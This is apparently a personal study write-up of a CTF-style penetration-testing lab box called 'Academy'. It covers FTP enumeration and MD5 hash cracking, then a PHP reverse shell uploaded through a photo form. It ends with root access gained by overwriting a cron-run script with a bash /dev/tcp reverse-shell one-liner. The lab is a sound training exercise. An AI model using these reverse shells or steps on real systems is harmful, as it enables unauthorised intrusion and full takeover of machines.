
# Academy Walkthrough
Treat these boxes as if they were CTFs (not actual pen-tests).
## [Nmap](CLI-tools/linux/nmap.md) Recon
```bash
sudo nmap -A -p- -T4 10.0.2.15
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-06 12:46 EDT
Nmap scan report for 10.0.2.15
Host is up (0.00066s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.2.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)
|   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)
|_  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:0A:72:50 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
### Port 22
SSH on a CTF is normally treated differently than on an actual pentest. On a pentest, brute forcing [SSH](/networking/protocols/SSH.md) might be necessary to check for weak credentials. Additionally, brute forcing SSH on a pentest can be used as a test of the client's detection measures. I.e. 500 attempts to brute force an SSH login should be noticed by the client.
### Port 80
Has an Apache webserver running. If we visit the address `http://<target IP>:80` in the browser, we'll see a default page for Apache 2. This could mean that *[PHP](coding/languages/PHP.md) is running the backend*. BTW, the default page *is considered a finding*, because it's disclosing architecture when it doesn't need to be.
### Port 21 ([FTP](networking/protocols/FTP.md))
We can use the [ftp command](CLI-tools/linux/ftp-command.md) to check the FTP service on the target. Let's attempt to login to the service using `anonymous` user.
```bash
ftp 10.0.2.15
Connected to 10.0.2.15.    
220 (vsFTPd 3.0.3)  
Name (10.0.2.15:hakcypuppy): anonymous  
331 Please specify the password.  
Password:   # <------- password is 'anonymous'        
230 Login successful.
Remote system type is UNIX. 
Using binary mode to transfer files.  
ftp>        # <------- ftp shell
```
We can also use `ftp anonymous@<target IP>` and a blank password.

If we type `ls` in the prompt, we can see a `note.txt`:
```bash
ftp> ls              
229 Entering Extended Passive Mode (|||22266|) 
150 Here comes the directory listing. 
-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt 
226 Directory send OK.   
ftp>   
```
We can download this file to our own computer using the `get` command in the ftp prompt:
```bash
ftp> get note.txt    
local: note.txt remote: note.txt               
229 Entering Extended Passive Mode (|||10905|)  
150 Opening BINARY mode data connection for note.txt (776 bytes).
100% |*****************************************************************************************|   776        2.17 MiB/s    00:00 ETA 
226 Transfer complete.                         
776 bytes received in 00:00 (250.43 KiB/s)     
ftp>   
```
We can also *upload a file here*. HOWEVER, there's no way to tell which directory this ftp server is listing for us. We can try to travel to it in the URL on the http page w/ `http://<target IP>:80/note.txt`, but it won't be there.

The idea is we could potentially *upload malware using the ftp server* and get code execution by going to the URL.
## Note.txt
Since we've exfiltrated this note, let's look at it:
```bash
cat note.txt
Hello Heath !
Grimmie has setup the test website for the new academy.
I told him not to use the same password everywhere, he will change it ASAP.

I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:

INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');

The StudentRegno number is what you use for login.

Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?
We can always adapt it to our needs.

-jdelta
```
Here is what we've learned from this note:
### SQL:
There is an [SQL](coding/languages/SQL.md) database storing information about users, including their passwords. Specifically, this table `students` stores student info.
### Run Ham
There is a student named 'Run Ham' whose password is `cd73502828457d15655bbd7a63fb0bc8` and ID number (for login) is 777777 for some endpoint called 'academy'. There's a chance this student hasn't had a chance to *change their default password yet.*
### Grimmie
Grimmie, whoever they are, *uses the same password everywhere*. We should keep them in mind b/c if we find their password, then we can likely use it multiple times to access other interfaces.
## Hashed Password
The 'password' we got from note.txt is likely actually a hash of a password. There are some tools we can use to try to figure out what the original password is from the hash.
### [Hash-identifier](cybersecurity/tools/cracking/hash-id.md)
... is a tool which takes a hash and outputs the possible/ likely algorithm which created it.
```bash
hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: cd73502828457d15655bbd7a63fb0bc8     # <------ hash goes here

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```
Now that we know it's an [MD5](computers/concepts/cryptography/hashing.md) hash, we can try to crack it.
### [hashcat](cybersecurity/tools/cracking/hashcat.md)
Hashcat is a command line tool which *uses your CPU* to crack hashes. For this hash we have to put it in a file to give to hashcat to crack:
```bash
hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting
...

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

cd73502828457d15655bbd7a63fb0bc8:student  # <-------- CRACKED PASSWORD            
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target...
```
## Directory Busting
Now that we have a username and password, we need to find where we can use them. From the note, we know they are meant for a 'student' who has a login for 'academy'.

Considering all of our open ports (SSH, FTP, HTTP), we can try to guess where these credentials might work. Starting w/ HTTP may be the easiest place to start since 'academy' could easily be an endpoint.

Instead of checking the academy endpoint in the browser, let's learn about [directory enumeration](cybersecurity/TTPs/recon/directory-enumeration.md) ('dir busting').
### [dirb](cybersecurity/tools/scanning-enumeration/dir-and-subdomain/dirb.md)
Dirb is a directory busting tool which is *recursive*, meaning it will go into every level of every directory found. This also makes it slow since it enters and enumerates every directory.
### [ffuf](cybersecurity/tools/scanning-enumeration/dir-and-subdomain/ffuf.md)
FUFF is another dir busting tool which is *non-recursive*. It enumerates on the level you tell it to when you give the command a placeholder (`FUZZ`):
```bash
ffuf -w /usr/share/wordlists/rockyou.txt:FUZZ -u http://10.0.2.15/FUZZ
```
Once it's returned the results from that level, you can run it again to enumerate on the next level in. For example, if Fuff found `http://10.0.2.15/academy` w/ the first search, then to enumerate the academy path, you would just change your command to be: `fuff ... -u http://10.0.2.15/academy/FUZZ`.
## Logging in
If we go to `http://10.0.2.15/academy` we get a login page where we can login with our new credentials.
![](nested-repos/PNPT-study-guide/PNPT-pics/academy-1.png)
![](/PNPT-pics/academy-1.png)
Once we're in, one of the interesting tabs we have access to is the `My Profile` tab. Clicking this, we find a form where we can upload a 'student photo'.
![](nested-repos/PNPT-study-guide/PNPT-pics/academy-2.png)
![](/PNPT-pics/academy-2.png)
Besides the photo upload, we can also pentest this for [SQL-injection](cybersecurity/TTPs/exploitation/injection/SQL-injection.md), etc.. However, the simplest place to start is to *use the form like its intended* and investigate from there.
## Student Photo Upload
### Plain Photo
Starting w/ a plain photo, let's see what happens:
![](nested-repos/PNPT-study-guide/PNPT-pics/academy-3.png)

![](/PNPT-study-guide/PNPT-pics/academy-3.png)
We can see a green success message, as well as our new photo. If we investigate the source, we might be able to figure out where the photo is being loaded from in the HTML:
![](nested-repos/PNPT-study-guide/PNPT-pics/academy-4.png)

![](/PNPT-pics/academy-4.png)
The endpoint for the photo is `studentphoto/duck.jpeg`. Let's try to go to that endpoint w/ the browser:
![](nested-repos/PNPT-study-guide/PNPT-pics/academy-5.png)

![](/PNPT-pics/academy-5.png)
The fact that we can see our duck in the browser means *the webserver is executing the file*, so we know if we upload some code *it will be executed*.
### Reverse Shell
Knowing that this is an Apache server, we can assume that PHP is running the backend. Additionally, we can see that php files are being referenced in the URLs.

PHP *executes on the server*, so whatever PHP is capable of doing, we can leverage to execute a [rev shell](cybersecurity/TTPs/exploitation/rev-shell.md). An easy PHP shell for us to use is [this one](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) from pentest monkey. Copy and paste the code, change the hostname and port values, and make sure [netcat](cybersecurity/tools/exploitation/netcat.md) is listening on the port.
```bash
nc -lvnp 44444
listening on [any] 44444 ...
connect to [10.0.2.4] from (UNKNOWN) [10.0.2.15] 51562
Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
 16:48:43 up 11:45,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1     -                Thu13   24:46m  0.04s  0.03s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
$ www-data
```
## Privilege Escalation
You've entered the machine as `www-data` who does not have a lot of permissions. However, with some snooping, we find a lot of tasty files w/i our reach in the. Specifically in `/var/www/html/includes` we find `config.php`. Let's cat that:
```bash
$ cat config.php
<?php
$mysql_hostname = "localhost";
$mysql_user = "grimmie";
$mysql_password = "My_V3ryS3cur3_P4ss";
$mysql_database = "onlinecourse";
$bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die("Could not connect database");
```
*We've found Grimmie's password!* This is specifically for mysql but we know that *Grimmie uses the same password for everything*. So let's try escalating our privilege by [SSH](networking/protocols/SSH.md)ing in as Grimmie:
```bash
ssh grimmie@10.0.2.15
grimmie@10.0.2.15''s password: My_V3ryS3cur3_P4ss
Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Oct  5 20:45:41 2023 from 10.0.2.4
grimmie@academy:~$  # <--- we in
```
## Grimmie
Now that we're logged in as Grimmie, let's see what they have in their home dir.
```bash
grimmie@academy:~$ ls
backup.sh
grimmie@academy:~$ cat backup.sh 
#!/bin/bash

rm /tmp/backup.zip
zip -r /tmp/backup.zip /var/www/html/academy/includes
chmod 700 /tmp/backup.zip
```
This file is removing a backup file, zipping a new one from the `.../html/academy/includes` dir, and setting permissions on it to root only.

Since this is a backup file *it's likely that it's being backed up on a scheduled interval* by this script. And since the script is able to set root permissions on it, it's likely the scrip is *being executed as root*. 

Theoretically, if we can swap this script out with our own, we can execute code as root. *But first* we need to make sure it actually is being executed on a schedule.
### Automated scripts/ jobs
There are a few things we can check to make sure this script is being executed regularly. The first, and least invasive is simply to check the last time the `/tmp/backup.zip` file was edited:
```bash
ls -al /tmp/backup.zip
-rwx------  1 root    root          2222 Oct  6 20:50 backup.zip 
```
Being that it's currently 20:51 when this command was run, we can see that `backup.zip` was recently accessed (w/i the last minute). We can either wait around to check again and see if we catch the next execution, or try a few other ways to check.
### [crontab](CLI-tools/linux/crontab.md)
`crontab` is a Linux tool which allows you to interface w/ [cron](computers/linux/linux-processes.md). Cron is a service which automates linux processes/ commands on an interval. If this `backup.sh` script is being ran on an interval, we might find a 'cronjob' for it.

Run `crontab -l` to see all the cron jobs associated w/ the current user (grimmie). Unfortunately, there are none. 
#### Systemd
Next we can check if there are any 'timers' w/ [systemd](computers/linux/linux-processes.md). Systemd is the service manager for linux and can be used to start and stop processes, etc.. To interact w/ systemd we use the `systemctl` command.

To list all of the systemctl timers, we use the command `systemctl list-timers`.
```bash
grimmie@academy:~$ systemctl list-timers
NEXT                         LEFT         LAST                         PASSED       UNIT           
Sat 2023-10-07 14:39:00 EDT  1min 1s left Sat 2023-10-07 14:09:01 EDT  28min ago    phpsessionclean
Sun 2023-10-08 00:00:00 EDT  9h left      Sat 2023-10-07 00:00:01 EDT  14h ago      logrotate.timer
Sun 2023-10-08 00:00:00 EDT  9h left      Sat 2023-10-07 00:00:01 EDT  14h ago      man-db.timer   
Sun 2023-10-08 04:45:10 EDT  14h left     Sat 2023-10-07 08:00:01 EDT  6h ago       apt-daily.timer
Sun 2023-10-08 06:06:18 EDT  15h left     Sat 2023-10-07 06:58:01 EDT  7h ago       apt-daily-upgra
Sun 2023-10-08 11:56:02 EDT  21h left     Sat 2023-10-07 09:10:01 EDT  5h 27min ago systemd-tmpfile

6 timers listed.
```
There are some timers, but none seem to be related to our backup file.
#### psypy
[psypy](/cybersecurity/tools/actions-on-objective/psypy.md) is a tool developed by DominicBreuker on GitHub. It allows us to monitor linux processes *without root permissions* w/ live updates. Other linux tools like `top`, `lsof`, and `ps aux` can also be used.
##### Usage
To use psypy as Grimmie we need to get it on the target machine. To do this, first we need to download and install it from the [psypy repo](https://github.com/DominicBreuker/pspy)  on our own machine, then serve it using [HTTP](www/HTTP.md).

Once it's served, we can `cd` into `/tmp` where `backup.zip` is and use `wget` to download it on the target machine. Now, change the permissions of `pspy64` so we can execute it using `chmod +x pspy64`. Now we can run it:
```bash
./psypy64
#####
## PLACEHOLDER
##
##
##
```
Scanning the output, we can see that `backup.sh` is being ran every minute.
### 2nd RevShell
Now that we've verified that `backup.sh` is being executed, we can manipulate that to get another shell, but this time *with root permissions and access*.
#### Our bash script:
A simple script to achieve a shell using [bash](coding/languages/bash.md) is the following:
```bash
!#/bin/bash

bash -i >& /dev/tcp/10.0.2.4/44445 0>&1
```
Use `nano` to edit `backup.sh`, get rid of the original code and replace it with this shell code. *Before saving the file* make sure you have another instance of [netcat](cybersecurity/tools/exploitation/netcat.md) up and listening to the correct port.

Once you save the file, it should get executed w/i the next 2 minutes, and on your listener you should see:
```bash
nc -lvnp 44445
listening on [any] 44445 ...
connect to [10.0.2.4] from (UNKNOWN) [10.0.2.15] 34634
bash: cannot set terminal process group (18009): Inappropriate ioctl for device
bash: no job control in this shell
root@academy:~#          # <----------- 
```
## Flag
Once we're in as root, all we have to do is observe our surroundings:
```bash
root@academy:~# ls
ls
flag.txt
root@academy:~# cat flag.txt
cat flag.txt  
Congratz you rooted this box !  
Looks like this CMS isn't so secure...  
I hope you enjoyed it.   
If you had any issue please let us know in the course discord. 
Happy hacking !                                                                                   
root@academy:~#    
```
## Notes on other avenues:
Having tried this box *without watching the walkthrough first*, there are some other interesting avenues one could try. The walkthrough above is a combo of my own investigations + the walkthrough supplied by TCM.
### mysql
Once you've SSH'd into the target as Grimmie, you can access the [mysql](CLI-tools/linux/mysql.md) database using the same password.
![](nested-repos/PNPT-study-guide/PNPT-pics/academy-6.png)
![](/PNPT-pics/academy-6.png)
Some tasty tables in here include: `db` and `user`, both of which give you access to credentials.

> [!Resources]
> - [hash-identifier repo](https://www.kali.org/tools/hash-identifier/)
> - [PentestMonkey: PHP Revshell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

> [!My previous notes (linked in text)]
> - You'll find them all [here](https://github.com/TrshPuppy/obsidian-notes)
